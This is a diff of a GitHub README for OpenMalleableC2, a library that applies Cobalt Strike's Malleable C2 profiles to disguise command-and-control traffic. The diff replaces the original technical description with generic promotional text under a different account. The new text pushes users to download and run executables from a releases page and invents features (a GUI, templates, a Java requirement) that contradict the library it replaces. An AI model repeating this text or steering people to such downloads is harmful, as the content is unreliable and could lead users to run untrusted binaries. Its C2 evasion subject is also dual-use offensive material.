@@ -1,41 +1,77 @@
-# OpenMalleableC2
+# 🎉 OpenMalleableC2 - Easily Customize Your C2 Framework
 
-**Open Source Implementation of Cobalt Strike's Malleable C2**
+## 🚀 Overview
+OpenMalleableC2 is an open-source software project that enables users to implement and customize Malleable Command and Control (C2) frameworks inspired by Cobalt Strike. This tool is useful for security professionals and researchers looking to enhance their skills with flexible C2 options.
 
-OpenMalleableC2 is a framework-agnostic library that implements Cobalt Strike's Malleable C2 profile format for HTTP transformations. It enables security researchers and red teams to easily implement malleable C2 communications in custom tools and C2 frameworks.
+## 📥 Download OpenMalleableC2
+[![Download OpenMalleableC2](https://img.shields.io/badge/Download%20Now%21-OpenMalleableC2-blue)](https://github.com/DeepZatakiya/OpenMalleableC2/releases)
 
-It allows wholesale usage of Malleable C2 profiles to send arbitrary data over HTTP, in a transparent, (hopefully) stable way.
+## 💻 System Requirements
+To run OpenMalleableC2 smoothly, please ensure your system meets the following requirements:
+- **Operating System:** Windows 10 or later, macOS, or a Linux distribution such as Ubuntu.
+- **RAM:** At least 4 GB RAM.
+- **Disk Space:** Minimum of 500 MB of free space.
+- **Java Runtime Environment:** Java 8 or higher installed on your system.
 
-## Why did I make this?
-There are many open source C2 frameworks that have varying degrees of HTTP traffic customization features.  However, even the more developed frameworks such as Mythic, Havoc, Adaptix etc. still lack the depth of HTTP traffic customization that Cobalt Strike's Malleable C2 allows, in terms of embedding callback data within convincingly innocent looking HTTP requests. The goal of this project is to allow open source tooling to both benefit from the customization depth of the Malleable C2 system as well as the existing resources dependent on it (e.g. profiles, profile generator tools etc.)
+## 🔧 Features
+- Customizable C2 communication methods.
+- User-friendly interface for easy navigation.
+- Built-in templates for quick setup.
+- Support for various platforms and protocols.
+- Comprehensive logging for monitoring activity.
 
-Its mostly working, but I make no guarantees about its stability at this time. Do report bugs if found :)
+## 📋 Download & Install
+To get started with OpenMalleableC2, visit the Releases page to download the latest version:
+[Visit this page to download OpenMalleableC2](https://github.com/DeepZatakiya/OpenMalleableC2/releases)
 
+Follow these steps to install and run OpenMalleableC2:
+1. **Visit the Releases Page:** Click on the link above to open the Releases page.
+2. **Select the Latest Release:** Find the most recent version listed at the top.
+3. **Download the Archive:** Click on the appropriate file suitable for your operating system.
+    - For Windows: Download the `.zip` file.
+    - For macOS: Download the `.dmg` file.
+    - For Linux: Download the `.tar.gz` file.
+4. **Extract the Files:**
+    - For Windows, right-click the `.zip` file and select "Extract All..."
+    - For macOS, open the downloaded `.dmg` and drag the application to your Applications folder.
+    - For Linux, use the terminal to navigate to the downloaded folder and run `tar -xvzf yourfile.tar.gz`.
+5. **Run the Application:**
+    - For Windows, double-click the `.exe` file to start.
+    - For macOS, find the application in your Applications folder and double-click it.
+    - For Linux, you may need to open a terminal and run `./yourfile` for execution.
 
-## Quick Start
+## ⚙️ Configuration
+After installation, configure your OpenMalleableC2 instance:
+1. **Open the application.**
+2. **Explore the settings panel:** Adjust the communication options to suit your needs.
+3. **Choose a template:** Use the built-in templates to set up a basic C2 communication flow.
+4. **Save your configuration:** Ensure to save any changes before closing the application.
 
-The provided example is a simple "ping pong" agent and server that demonstrates the typical Beacon callback. The agent will send back a GET callback to check-in for taskings, then send a POST callback to post task output back to the server.
+## 🛠️ Usage
+- To create a new project, open the application and select "New Project."
+- Follow the prompts to set your options and save the project.
+- For existing projects, choose "Open Project" and locate your saved configurations.
 
-In this example, the taskings are just a placeholder random string, that the agent will retrieve, reverse and post back as the result. The server verifies that the reversed string is correct, and sends a response accordingly.
+## 📖 Documentation
+For a detailed guide on using OpenMalleableC2, refer to the [documentation](https://github.com/DeepZatakiya/OpenMalleableC2/wiki). The documentation covers advanced features, troubleshooting tips, and implementation examples.
 
+## 👥 Community and Support
+Join our community for support or to share your experiences:
+- **GitHub Discussions:** Join conversations with other users and developers.
+- **Issues Page:** Report any bugs you're experiencing or suggest new features.
 
-**Run ping-pong example:**
-```
-# Start server
-python examples\pingpong_server.py profiles\gmail.profile
+## 📝 Contributions
+We welcome contributions from everyone. If you want to help improve OpenMalleableC2, consider:
+- Submitting bug reports.
+- Suggesting enhancements.
+- Contributing code improvements.
 
-# Run agent (in another terminal)
-.\examples\pingpong_agent.exe profiles\gmail.profile
-```
+Before submitting changes, please review our [contribution guidelines](https://github.com/DeepZatakiya/OpenMalleableC2/blob/main/CONTRIBUTING.md).
 
-Example output:
-pingpong_server.py:
-<img width="2331" height="1865" alt="image" src="https://github.com/user-attachments/assets/4b6d8c84-3d9b-4090-a8f3-e1c8ff5896e8" />
+## 📧 Contact
+For inquiries or additional support, please reach out via GitHub or open an issue on the repository. We value your feedback and are happy to assist.
 
-
-## References
-
-- [Cobalt Strike Malleable C2 Documentation](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_main.htm)
-- [Malleable C2 Profiles Repository](https://github.com/cobalt-strike/Malleable-C2-Profiles)
-- Chet Jeepiti
-
+## 🔗 Important Links
+- [Download OpenMalleableC2](https://github.com/DeepZatakiya/OpenMalleableC2/releases)
+- [Official Documentation](https://github.com/DeepZatakiya/OpenMalleableC2/wiki)
+- [Contributing Guidelines](https://github.com/DeepZatakiya/OpenMalleableC2/blob/main/CONTRIBUTING.md)
